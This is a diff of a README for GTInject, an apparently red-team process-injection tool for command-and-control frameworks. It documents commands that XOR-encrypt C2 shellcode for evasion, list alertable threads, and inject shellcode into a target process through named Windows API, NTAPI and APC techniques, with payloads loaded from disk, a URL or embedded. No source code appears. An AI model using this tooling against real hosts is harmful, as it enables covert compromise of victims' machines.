@@ -5,41 +5,80 @@ Build re-usable process injection for multiple C2s. Based off of design of BRC4.
 
 ## GTInject.exe Help Menu
 
-## Usage: GTInject.exe <command> <commandArgs>
+## Usage: GTInject.exe \<module> \<moduleArgs>
        GTInject.exe threads
        GTInject.exe encrypt pathToSource.bin MySecretXorKey
        GTInject.exe inject memoryOption execOption xorkey binSrcType binSourcePath PID TID
 
-       GTInject.exe inject 1 1 SecretKey123 disk "C:\path\to\xordShellcode.file" 1234 321
+       GTInject.exe inject 100 100 SecretKey123 disk "C:\path\to\xordShellcode.file" 1234 321
 
 ## Encrypt  -- for encrypting shellcode:
-        Shellcode from your C2 will be multibyte XOR'd and written as a base64 string in a text file
-        This is intended to help you use the injection option later
-        This is also my utility for encrypting payloads to be used in shellcode runners
+**Do this in preparation, NOT on the C2 victim machine.**
 
-        Do this in preparation, not on the C2 victim machine.
+       GTInject.exe encrypt pathToSource.bin MySecretXorKey
+
+Shellcode from your C2 will be multibyte XOR'd and written in various formats.
+
+This is intended to help you use the injection option later with better OpSec.
 
 ## Threads  -- check for alertable threads:
-        This will list all threads and their current execution state
-        This is intended to help identify alertable threads, for injection options.
+
+       GTInject.exe threads
+
+
+This will list all threads and their current execution state.
+
+This is intended to help identify alertable threads, for injection options like QueueUserAPC.
+It will show processes you have access to, and any threads in the following states:
+- Wait
+- Suspended
+- Delay Execution
+
+
 
 ## Inject   -- choose a process injection method
-        Choose a technique for allocating the memory
-        Then choose a technique for executing the thread
-        Enter the XorKey to decrypt it with
-        Specify a location type where the encrypted shellcode is stored 
-        Specify the location
-        Specify the PID
-        OPTIONALLY specify the TID (not all options need a Thread ID)
+
+       GTInject.exe inject memoryOption execOption xorkey binSrcType binSourcePath PID TID
+
+       GTInject.exe inject 100 100 SecretKey123 disk "C:\path\to\xordShellcode.file" 1234 321
+
+Choose a technique for allocating the memory from your options below.
+
+Then choose a technique for executing the thread from your options below.
+
+Enter the XorKey to decrypt it with, the same one you used to encrypt the shellcode earlier.
+
+Specify a location type where the encrypted shellcode is stored. Acceptable values are
+- disk
+- url
+- embedded
+
+Specify the path to that shellcode
+- "C:\path\to\shellcode.file"
+- https://example.com/shellcode.b64file
+- 0 (embedded)
+
+Specify the PID you want to inject into.
+
+OPTIONALLY specify the TID (not all options need a Thread ID).
+
+## Call Categories
+- 100 Series - WINAPI
+- 200 Series - NTAPI 
+- 300 Series - Syscalls
+- 400 Series - Misc Techniques
 
 ## Memory Options
-        1. WINAPI -- VirtualAllocEx, WriteProcessMemory
-        2. WINAPI -- MapViewOfSection, WriteProcessMemory
+        100. WINAPI -- VirtualAllocEx, WriteProcessMemory
+        200. NTAPI  -- NtCreateSection, NtMapViewOfSection, RtlCopyMemory
 
 ## ThreadExec Options
-        1. WINAPI -- CreateRemoteThread
+        100. WINAPI -- CreateRemoteThread
+        101. WINAPI -- QueueUserAPC & ResumeThread
+        200. NTAPI  -- NtCreateThreadEx
 
 # ToDo
+* Obvious add more techniques
 * In the Alertable Threads function - bring in integrity - filter based on AppContainers - have option to show all anyway
 * Better ReadMe
 * Add Sleep / Delay function, determine where delay should happen ... set to 30 seconds, memory allocation will happen, wait 30, then exec option will proceed. or between each API call? add Jitter/multiplier? so user selects 10 seconds, 3x and it will wait at least 10 seconds, and up to 30 seconds between execution?
